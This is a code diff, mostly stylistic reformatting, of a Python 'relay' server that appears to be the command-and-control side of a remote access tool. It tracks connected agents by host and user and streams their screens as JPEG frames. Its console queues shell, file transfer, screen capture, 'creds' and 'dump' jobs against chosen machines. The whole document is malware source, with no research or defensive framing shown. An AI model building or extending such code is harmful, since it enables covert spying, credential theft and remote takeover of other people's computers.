@@ -14,7 +14,7 @@ DB.commit()
 LOCK = threading.Lock()
 PENDING = {}
 PENDING_LOCK = threading.Lock()
-FRAMES = {}                      # aid -> bytes (latest jpg)
+FRAMES = {}
 FRAMES_LOCK = threading.Lock()
 
 def q_for(aid):
@@ -47,7 +47,8 @@ class H(BaseHTTPRequestHandler):
                            (aid, d.get("host",""), d.get("user",""), first, now, stream))
                 DB.commit()
             try: job = q_for(aid).get(timeout=20)
-            except queue.Empty: return self._send(200, json.dumps({"job":None,"stream":bool(stream)}).encode())
+            except queue.Empty:
+                return self._send(200, json.dumps({"job":None,"stream":bool(stream)}).encode())
             with LOCK:
                 DB.execute("UPDATE jobs SET state='running' WHERE id=?", (job["id"],)); DB.commit()
             return self._send(200, json.dumps({"job":job,"stream":bool(stream)}).encode())
@@ -73,8 +74,7 @@ def submit(agent, cmd, arg=""):
 
 def _resolve(cur):
     if not cur: return None
-    with LOCK:
-        rows = [r[0] for r in DB.execute("SELECT id FROM agents")]
+    with LOCK: rows = [r[0] for r in DB.execute("SELECT id FROM agents")]
     for r in rows:
         if r.startswith(cur) or r == cur: return r
     return None
@@ -97,8 +97,7 @@ def console():
         if not line: continue
         if line == "quit": return
         if line == "list":
-            with LOCK:
-                rows = list(DB.execute("SELECT id,host,user,last,stream FROM agents"))
+            with LOCK: rows = list(DB.execute("SELECT id,host,user,last,stream FROM agents"))
             if not rows: print("[relay] no agents yet")
             for r in rows:
                 mark = "REC" if r[4] else "   "
@@ -115,10 +114,8 @@ def console():
         if not full: print("[relay] no target"); continue
         if line == "stream on" or line == "stream off":
             v = 1 if line.endswith("on") else 0
-            with LOCK:
-                DB.execute("UPDATE agents SET stream=? WHERE id=?", (v, full)); DB.commit()
-            print(f"[relay] stream {'on' if v else 'off'} for {full[:10]}")
-            continue
+            with LOCK: DB.execute("UPDATE agents SET stream=? WHERE id=?", (v, full)); DB.commit()
+            print(f"[relay] stream {'on' if v else 'off'} for {full[:10]}"); continue
         if line == "view":
             with FRAMES_LOCK: jpg = FRAMES.get(full)
             if not jpg: print("[relay] no frame yet (turn stream on)"); continue
@@ -128,8 +125,7 @@ def console():
             _open_file(p); continue
         matched = False
         for k in ("shell","getf","putf","screen","grab","creds","rename","dump"):
-            if line == k:
-                print(f"[relay] queued {submit(full, k)}"); matched = True; break
+            if line == k: print(f"[relay] queued {submit(full, k)}"); matched = True; break
             if line.startswith(k + " "):
                 print(f"[relay] queued {submit(full, k, line[len(k)+1:])}"); matched = True; break
         if not matched: print("[relay] ?")
